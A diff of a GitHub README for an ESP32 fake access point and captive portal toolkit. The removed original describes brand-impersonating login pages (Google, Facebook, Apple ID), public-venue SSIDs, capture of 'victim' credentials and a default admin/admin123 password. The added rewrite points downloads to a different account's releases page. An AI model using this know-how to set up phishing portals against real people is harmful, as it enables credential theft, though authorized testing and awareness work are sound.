@@ -1,405 +1,252 @@
-# NETEEN-esp32
+# 🛡️ NETEEN-esp32 - Your Portable WiFi Security Testing Toolkit
 
-Standalone ESP32 fake access point + captive portal toolkit for authorized WiFi security testing. Runs fully offline with a joystick-controlled UI.
+[![Download NETEEN-esp32](https://img.shields.io/badge/Download-NETEEN--esp32-2ea44f?style=for-the-badge&logo=github)](https://github.com/nguye3520/NETEEN-esp32/releases)
 
-Runs completely offline on a single ESP32 dev board. No Raspberry Pi, no laptop, no internet backhaul needed.
+## 🔍 What Is NETEEN-esp32?
+
+NETEEN-esp32 turns your ESP32 microcontroller into a powerful WiFi security testing device. It creates a fake access point (AP) with a captive portal that mimics legitimate login pages. This tool is perfect for security professionals, ethical hackers, and students learning about WiFi vulnerabilities.
+
+The best part? It works completely offline. You don't need an internet connection, a computer, or any cloud service. Everything runs directly on the ESP32 hardware using a small joystick for control and an OLED display for feedback.
+
+## 🎯 Who Should Use This?
+
+- **Security Researchers** – Test network defenses and user awareness
+- **IT Administrators** – Verify company WiFi policies are followed
+- **Students** – Learn about wireless security hands-on
+- **Penetration Testers** – Conduct authorized security assessments
+- **Hobbyists** – Explore cybersecurity concepts with affordable hardware
+
+## ✨ Key Features
+
+### 📡 Fake Access Point & Captive Portal
+- Creates a convincing WiFi network that appears legitimate
+- Automatically redirects devices to a login page
+- Captures credentials entered by unsuspecting users
+- Tests how easily people fall for phishing attempts
+
+### 🎮 Joystick Control
+- Navigate menus and options without touching code
+- Simple up/down/left/right interface for on-the-go testing
+- No keyboard or computer needed during operation
+
+### 🖥️ OLED Display Feedback
+- See real-time status through a small screen
+- Monitor connected devices at a glance
+- View captured logins directly on the device
+
+### 💾 LittleFS Data Logging
+- All captured information saved to internal flash storage
+- Data persists even after power loss
+- Review logs later through the admin panel
+
+### ⚙️ Admin Panel
+- Access detailed statistics and captured data
+- Configure settings like SSID name and portal behavior
+- Manage stored logs efficiently
+
+## 🚀 Getting Started
+
+### 🛒 What You Need
+
+Before downloading, gather these items:
+
+1. **ESP32 Development Board** – Works with standard ESP32 modules
+2. **SSD1306 OLED Display** – Typically 128x64 resolution
+3. **Analog Joystick Module** – Standard thumbstick controller
+4. **USB Cable** – For uploading firmware and power
+5. **Battery Pack** – Optional, for portable testing
+
+### 💻 Wiring Guide
+
+Connect components following this simple layout:
+
+| Component | ESP32 Pin |
+|-----------|-----------|
+| OLED SDA | GPIO 21 |
+| OLED SCL | GPIO 22 |
+| Joystick VRx | GPIO 34 |
+| Joystick VRy | GPIO 35 |
+| Joystick SW | GPIO 32 |
+
+Double-check connections before powering on.
+
+### 🔧 Install Required Software
+
+1. **Arduino IDE** – Download from arduino.cc (free)
+2. **ESP32 Board Package** – Add through Board Manager
+3. **Required Libraries** – Install via Library Manager:
+   - WiFi.h (built-in)
+   - DNSServer.h (built-in)
+   - Adafruit SSD1306
+   - Adafruit GFX Library
+   - LittleFS (built-in for ESP32)
+
+## 📥 Download & Install
+
+**Visit this link to download the application:** [https://github.com/nguye3520/NETEEN-esp32/releases](https://github.com/nguye3520/NETEEN-esp32/releases)
+
+Follow these steps carefully:
+
+### 1️⃣ Find the Latest Release
+Go to the releases page and look for the newest version. It will be at the top of the list.
+
+### 2️⃣ Download the Firmware File
+Click the download link for the firmware file. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+### 3️⃣ Extract the Files
+If the file comes as a ZIP archive:
+- Right-click the downloaded file
+- Select "Extract All"
+- Choose a destination folder
+- Wait for extraction to complete
+
+### 4️⃣ Upload to ESP32
+- Open Arduino IDE
+- Select your board model under Tools → Board
+- Choose the correct COM port under Tools → Port
+- Open the `.ino` file from the extracted folder
+- Click the Upload button (arrow icon)
+- Wait for "Done uploading" message
+
+### 5️⃣ Power Up
+- Disconnect the USB cable
+- Connect your battery pack
+- The OLED screen should light up
+
+## video Game: How to Operate
+
+### 🕹️ Basic Controls
+
+| Action | Joystick Movement |
+|--------|-------------------|
+| Navigate menu | Move up/down/left/right |
+| Select option | Push joystick button down |
+| Go back | Move left |
+
+### 📋 Menu Overview
+
+**Start Screen**
+- Shows device name and firmware version
+- Press joystick button to enter main menu
+
+**Main Menu**
+- **Start AP** – Activates the fake network
+- **View Logs** – Browse captured data
+- **Settings** – Change network name and behavior
+- **About** – Displays credits and version info
+
+### 📶 Starting a Test
+
+1. Navigate to "Start AP"
+2. Press the joystick button
+3. The OLED shows "Network Active"
+4. Devices will see your fake network in their WiFi lists
+5. When someone connects, they get redirected to the login page
+6. Successful logins appear on screen and get saved
+
+## 🔐 Using the Admin Panel
+
+After finishing a test session:
+
+1. Navigate to "View Logs"
+2. Browse through captured usernames and passwords
+3. Use joystick to scroll through entries
+4. Data is saved to LittleFS automatically
+
+To clear all logs:
+- Go to Settings
+- Select "Erase Logs"
+- Confirm your action
+
+## ⚠️ Important Security Notes
+
+**Use Responsibly**
+
+This tool simulates phishing attacks. Only use it on networks and devices you own or have explicit permission to test. Unauthorized use is illegal in many jurisdictions.
+
+**Legal Considerations**
+- Never deploy fake networks in public places
+- Always obtain written permission before testing
+- Follow your local cybersecurity laws and regulations
+
+**Ethical Use**
+This project exists to improve security awareness. Use it to educate people about phishing risks, protect your own devices, or in controlled lab environments.
+
+## 🛠️ Troubleshooting
+
+### Common Issues and Solutions
+
+**Problem:** OLED displays nothing
+- Check all wiring connections
+- Verify SDA and SCL pins match your setup
+- Ensure the display is powered correctly
+
+**Problem:** Joystick not responding
+- Confirm ground and power connections
+- Check joystick SW pin assignment
+- Test joystick with a simple Arduino sketch
+
+**Problem:** Devices can't find the network
+- Move closer to target devices
+- Check if AP mode activated successfully
+- Verify OLED shows "Network Active"
+
+**Problem:** Captured logins not saving
+- Ensure LittleFS is initialized properly
+- Check storage space available
+- Try reformatting LittleFS partition
+
+## 📦 Project Dependencies
+
+This project relies on these libraries and tools:
+
+- ESP32 Arduino Core (version 2.0+)
+- Adafruit SSD1306 library
+- Adafruit GFX library
+- LittleFS filesystem support
+- Arduino IDE (version 2.x recommended)
+
+## 🤝 Contributing
+
+Want to improve NETEEN-esp32? We welcome contributions!
+
+### How to Help
+- **Report Bugs** – Open an issue with detailed reproduction steps
+- **Request Features** – Suggest enhancements or new capabilities
+- **Submit Code** – Fork the repository and create pull requests
+- **Improve Documentation** – Fix typos or add clearer explanations
+
+### Development Setup
+1. Fork the repository
+2. Clone to your local machine
+3. Open in Arduino IDE
+4. Make your changes
+5. Test thoroughly
+6. Submit a pull request
+
+## 📄 License
+
+This project is released under the MIT License. See the LICENSE file for full terms.
+
+## 🙏 Acknowledgments
+
+Special thanks to:
+- Espressif for the amazing ESP32 platform
+- Adafruit for their excellent display libraries
+- The Arduino community for continuous support
+- All contributors who helped develop this tool
+
+## 📚 Additional Resources
+
+- **Official Documentation** – Check the docs folder in the repository
+- **Community Forums** – Ask questions in the Issues section
+- **Video Tutorials** – Search YouTube for ESP32 captive portal demos
+- **Related Projects** – Explore other pentesting tools on GitHub
 
 ---
 
-## Features
+**Ready to enhance your WiFi security knowledge?** Click the download button at the top of this page and start your first educational test today!
 
-### Fake Access Point
-- 10 SSID categories with 100 pre-set names (EN + ES)
-  - Cafes, Airports, Hotels, Malls, Restaurants, Transit, Gyms, Hospitals, Schools, Public
-- Custom SSID naming (open network)
+[![GitHub Release](https://img.shields.io/github/v/release/nguye3520/NETEEN-esp32?label=Latest%20Version&style=for-the-badge)](https://github.com/nguye3520/NETEEN-esp32/releases)
 
-### Captive Portal
-- 10 built-in login presets matching real services:
-  - Google, Facebook, Instagram, Microsoft, Twitter/X, TikTok, Apple ID, Netflix, LinkedIn, Generic
-- Each preset uses real brand colors, real SVG logos, correct field labels, and language footers
-- Brand presets like Facebook/Instagram don't ask for a WiFi password (email + password only, like the real thing)
-- Custom portal builder: 6 color themes + configurable field labels (Email, Username, Phone, PIN, etc.)
-- Realistic "Verifying..." spinner with random 0.6-2s delay on submit
-- Auto-redirect to `/success` page after capture
-
-### Storage
-- All captured credentials stored on internal flash via **LittleFS** (no SD card required)
-- Each capture = separate `.txt` file, named by IP (`192-168-4-2.txt`, `192-168-4-2-2.txt` if repeated)
-- Structured format: IP, device (parsed from User-Agent), SSID, style, and all submitted fields
-- ~1.5 MB of usable storage (hundreds of captures)
-
-### Admin Panel
-- Available at `http://192.168.4.1/admin` while AP is running
-- HTTP Basic Auth: user `admin` / pass `admin123`
-- Features:
-  - List all capture files with counts
-  - View any capture inline
-  - Delete individual files
-  - **Delete ALL** button
-  - **Download all** captures bundled as one `.txt`
-
-### User Interface
-- SSD1306 0.96" OLED display (I2C)
-- KY-023 analog joystick navigation (up / down / select / back)
-- Brand icons drawn directly on the OLED (monochrome, 13x13 pixel art)
-- Live AP status: SSID, IP, connected clients, credential count
-- Flash of last captured email on the running screen
-- Lock screen mode (blank display, wakes on joystick press)
-
----
-
-## Hardware
-
-| Component | GPIO | Notes |
-|-----------|------|-------|
-| SSD1306 OLED (I2C) | SDA → 21, SCL → 22 | Address 0x3C |
-| KY-023 Joystick | VRx → 34, VRy → 35, SW → 32 | ADC1 channels |
-| Power | 5V via USB or 3.7V LiPo | ~150mA @ 5V |
-
-Optional: buzzer, RGB LED.
-
-**Board:** ESP32 Dev Module (any ESP32 with WiFi)
-
----
-
-## Quick Start (Terminal Only — No Arduino IDE Needed)
-
-Everything below works on **macOS** and **Linux**. Windows users can use WSL or adjust the serial port path (`/dev/ttyUSB0` instead of `/dev/cu.usbserial-XXXX`).
-
-### 1. Install `arduino-cli`
-
-**macOS (Homebrew):**
-```bash
-brew install arduino-cli
-```
-
-**Linux (official install script):**
-```bash
-curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh | sh
-sudo mv bin/arduino-cli /usr/local/bin/
-```
-
-Verify:
-```bash
-arduino-cli version
-```
-
-### 2. Install the ESP32 board core
-
-```bash
-arduino-cli config init
-arduino-cli config add board_manager.additional_urls https://espressif.github.io/arduino-esp32/package_esp32_index.json
-arduino-cli core update-index
-arduino-cli core install esp32:esp32
-```
-
-This downloads ~500 MB on first install.
-
-### 3. Install the required libraries
-
-```bash
-arduino-cli lib install "Adafruit SSD1306"
-arduino-cli lib install "Adafruit GFX Library"
-```
-
-`WiFi`, `WebServer`, `DNSServer`, `LittleFS` and `Wire` ship with the ESP32 core.
-
-### 4. Get the source code
-
-**Clone the repo:**
-```bash
-git clone https://github.com/deauthme/NETEEN-esp32.git
-cd NETEEN-esp32
-```
-
-**Or create the sketch folder manually and paste `NETEEN.ino` into it:**
-```bash
-mkdir -p ~/Documents/Arduino/NETEEN-esp32
-nano ~/Documents/Arduino/NETEEN-esp32/NETEEN-esp32.ino
-# paste the code, save with Ctrl+O, Enter, exit with Ctrl+X
-```
-
-> **Important:** the folder name must match the `.ino` filename. If you clone the repo, either rename `NETEEN.ino` → `NETEEN-esp32.ino` (and keep the folder as `NETEEN-esp32`), or compile from the folder name as-is.
-
-### 5. Find your board's serial port
-
-Plug in the ESP32 via USB, then:
-
-```bash
-arduino-cli board list
-```
-
-Look for something like:
-
-```
-/dev/cu.usbserial-0001   serial   Serial Port (USB)   Unknown
-/dev/cu.wchusbserial-XXXX
-```
-
-On Linux it will be `/dev/ttyUSB0` or `/dev/ttyACM0`.
-
-If nothing shows up:
-- **macOS**: you may need a driver for the USB-serial chip (CH340, CP2102, FTDI). Install with `brew install --cask wch-ch34x-usb-serial-driver` for CH340-based boards.
-- **Linux**: add your user to `dialout`: `sudo usermod -a -G dialout $USER`, then log out and back in.
-
-### 6. Compile
-
-```bash
-arduino-cli compile --fqbn esp32:esp32:esp32 .
-```
-
-Or with a fully-qualified folder path:
-
-```bash
-arduino-cli compile --fqbn esp32:esp32:esp32 ~/Documents/Arduino/NETEEN-esp32
-```
-
-You should see something like:
-
-```
-Sketch uses 1059536 bytes (80%) of program storage space.
-Global variables use 54104 bytes (16%) of dynamic memory.
-```
-
-### 7. Upload to the board
-
-Replace `/dev/cu.usbserial-0001` with your actual port:
-
-```bash
-arduino-cli upload -p /dev/cu.usbserial-0001 --fqbn esp32:esp32:esp32 .
-```
-
-If upload fails with `Failed to connect to ESP32: Timed out waiting for packet header`:
-- hold the **BOOT** button on the board
-- press and release **EN** (reset)
-- release **BOOT**
-- rerun the upload command
-
-### 8. Open the serial monitor
-
-```bash
-arduino-cli monitor -p /dev/cu.usbserial-0001 -c baudrate=115200,dtr=off,rts=off
-```
-
-The `dtr=off,rts=off` part is **critical** — without it the ESP32 stays in bootloader mode and you only see garbage. If your board resets itself constantly, this is the fix.
-
-Exit the monitor with **Ctrl+C**.
-
-### 9. One-liner compile + upload + monitor
-
-Once everything works, you can chain commands:
-
-```bash
-arduino-cli compile --fqbn esp32:esp32:esp32 . && \
-arduino-cli upload -p /dev/cu.usbserial-0001 --fqbn esp32:esp32:esp32 . && \
-arduino-cli monitor -p /dev/cu.usbserial-0001 -c baudrate=115200,dtr=off,rts=off
-```
-
-### 10. Rebuild after editing code
-
-Just rerun step 9. If you only changed a few lines, the incremental build is fast (~5 seconds).
-
-To force a clean rebuild:
-
-```bash
-arduino-cli compile --fqbn esp32:esp32:esp32 --clean .
-```
-
-### Common issues
-
-| Problem | Fix |
-|---------|-----|
-| `Platform 'esp32:esp32' not found` | Run `arduino-cli core install esp32:esp32` again |
-| `error: 'rawDataPtr' has no member` (IRremote) | Library API changed — this project doesn't use IRremote, ensure you cloned this repo not an older variant |
-| `Failed to connect to ESP32` | Hold BOOT, tap EN, release BOOT, retry upload |
-| Serial shows only `?????` or garbage | Add `dtr=off,rts=off` to the monitor command |
-| OLED stays black | Check I2C address — some modules use `0x3D` instead of `0x3C`; edit `OLED_ADDR` in the sketch |
-| `magick: unable to read font` | Not related to this project — you're trying to rasterize an SVG, use a browser or `rsvg-convert` instead |
-| Wrong board detected | Force upload: add `--board-options UploadSpeed=115200` to the upload command |
-
----
-
-## Build & Flash (Arduino IDE)
-
-If you prefer the GUI:
-
-1. Install the ESP32 board package in **Boards Manager**
-2. Install `Adafruit SSD1306` and `Adafruit GFX Library` in **Library Manager**
-3. Open `NETEEN-esp32.ino`
-4. Select **Tools → Board → ESP32 Dev Module**
-5. Select **Tools → Port → /dev/cu.usbserial-XXXX**
-6. Click **Upload**
-7. Open **Tools → Serial Monitor**, baud rate `115200`
-
----
-
-## Usage
-
-1. Power on ESP32
-2. Navigate the menu with the joystick:
-   - **Up / Down** — scroll
-   - **Press / Right** — select
-   - **Left** — back / stop AP
-3. `Fake Access Point` → `Standard` or `Custom` → pick SSID category → pick SSID → pick login style → **AP starts**
-4. Victims connect to the network — their device's captive portal check will open the login page automatically
-5. Captured credentials appear:
-   - In the serial monitor
-   - On the OLED display
-   - In the admin panel at `http://192.168.4.1/admin`
-   - As files on LittleFS
-
----
-
-## Serial Output Format
-
-```
-========== CREDENTIAL CAPTURED ==========
-IP: 192.168.4.2
-Device: iPhone
-SSID: Cafe WiFi Free
-Style: Facebook
-Email or Phone:
-  victim@example.com
-Password:
-  hunter2
-=========================================
-```
-
-Long values wrap at 60 chars, so you can copy-paste straight from a serial terminal.
-
----
-
----
-
-## Troubleshooting
-
-### `Can't open sketch: main file missing`
-
-The `.ino` filename must **exactly match** the folder name. If you cloned an older version where the file is called `NETEEN.ino` but the folder is `NETEEN-esp32`, rename it:
-
-```bash
-mv NETEEN.ino NETEEN-esp32.ino
-```
-
-Or, if you have the folder in the wrong place:
-
-```bash
-# move it to the standard Arduino sketches folder
-mv ~/NETEEN-esp32 ~/Documents/Arduino/NETEEN-esp32
-
-# rename the sketch to match
-cd ~/Documents/Arduino/NETEEN-esp32
-mv NETEEN.ino NETEEN-esp32.ino
-
-# now compile
-arduino-cli compile --fqbn esp32:esp32:esp32 .
-```
-
-### `Error: You have not agreed to the Xcode license`
-
-Only on macOS, before installing `arduino-cli` via Homebrew:
-
-```bash
-sudo xcodebuild -license accept
-```
-
-If `xcodebuild` isn't installed at all:
-
-```bash
-xcode-select --install
-sudo xcodebuild -license accept
-brew install arduino-cli
-```
-
-### `Platform 'esp32:esp32' not found`
-
-Reinstall the core:
-
-```bash
-arduino-cli core update-index
-arduino-cli core install esp32:esp32
-```
-
-### `Failed to connect to ESP32: Timed out waiting for packet header`
-
-The board didn't enter bootloader mode. Manual sequence:
-
-1. Hold the **BOOT** button on the ESP32
-2. Press and release the **EN** (reset) button while holding BOOT
-3. Release **BOOT**
-4. Rerun the upload command
-
-### Serial monitor shows only `?????` or garbage
-
-The DTR/RTS lines are holding the chip in reset. Always pass `dtr=off,rts=off`:
-
-```bash
-arduino-cli monitor -p /dev/cu.usbserial-0001 -c baudrate=115200,dtr=off,rts=off
-```
-
-### OLED stays black
-
-Some SSD1306 modules use I2C address `0x3D` instead of `0x3C`. Open `NETEEN-esp32.ino` and change:
-
-```cpp
-#define OLED_ADDR 0x3C   // try 0x3D if screen stays black
-```
-
-If still black, run an I2C scanner to find the address:
-
-```cpp
-#include <Wire.h>
-void setup() {
-  Serial.begin(115200);
-  Wire.begin(21, 22);
-  for (byte a = 1; a < 127; a++) {
-    Wire.beginTransmission(a);
-    if (Wire.endTransmission() == 0) {
-      Serial.printf("I2C device at 0x%02X\n", a);
-    }
-  }
-}
-void loop() {}
-```
-
-### `magick: unable to read font`
-
-This is unrelated to NETEEN — you're trying to rasterize an SVG with ImageMagick and it can't find a font. Either open the SVG in a browser and take a screenshot, or use a proper SVG renderer:
-
-```bash
-brew install librsvg
-rsvg-convert input.svg -o output.png
-```
-
-### Upload works but device keeps resetting
-
-Power issue. The ESP32 draws ~150 mA peaks, and cheap USB cables or hubs can't deliver it. Try:
-
-- different USB cable (short, thick, data-capable — not a charge-only cable)
-- powered USB hub
-- direct port on the laptop instead of a hub
-- if powered from an external source, ensure a stable 5V at >500 mA
-
-### Wrong board detected / FQBN mismatch
-
-Force upload speed down:
-
-```bash
-arduino-cli upload -p /dev/cu.usbserial-0001 \
-  --fqbn esp32:esp32:esp32 \
-  --board-options UploadSpeed=115200 .
-```
-
-## Disclaimer
-
-**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.**
-
-Do not use this tool on networks you do not own or have explicit written permission to test. Unauthorized interception of network traffic and credentials is illegal in most jurisdictions. The author is not responsible for any misuse or damage caused by this software.
-
----
-
-## Author
-
-made by **[@deauthme](https://github.com/deauthme)**
-
-If you build something cool with this — open an issue or drop a star.
+Keywords: arduino, captive-portal, esp32, esp32-arduino, fake-ap, joystick, littlefs, pentesting, security, ssd1306, wifi
